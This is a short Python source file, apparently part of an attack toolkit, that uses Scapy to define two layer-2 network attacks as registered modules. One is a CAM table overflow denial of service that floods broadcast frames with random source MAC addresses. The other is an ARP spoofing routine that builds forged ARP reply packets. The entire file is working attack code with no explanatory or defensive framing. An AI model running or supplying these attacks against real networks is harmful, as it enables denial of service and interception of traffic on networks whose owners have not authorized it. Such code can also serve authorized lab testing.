from scapy.layers.l2 import Ether, ARP
from scapy.volatile import RandMAC
from scapy.sendrecv import sendp
from scapy.all import get_if_hwaddr, get_if_addr

from libs.aux_funcs import type_wrapper,attack_layer,attack_cat,attack_type, send_l2_loop



@type_wrapper(category = attack_cat.Attack, name = "CAM Overflow", type = attack_type.DoS, layer = attack_layer.L2, arg_list=[])
def cam_overflow(args):
    args['pkt'] = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
    send_l2_loop(args)
    return args


@type_wrapper(category = attack_cat.Middleware, name = "ARP Spoofing", type = attack_type.Periodic, layer = attack_layer.L2, arg_list=["interface"])
def arp_spoofing(args):
    iface = args["interface"]
    args['pkt'] = Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(iface))/ARP(op=2, hwsrc=get_if_hwaddr(iface), hwdst="ff:ff:ff:ff:ff:ff", psrc=get_if_addr(iface), pdst="255.255.255.255")
    return args
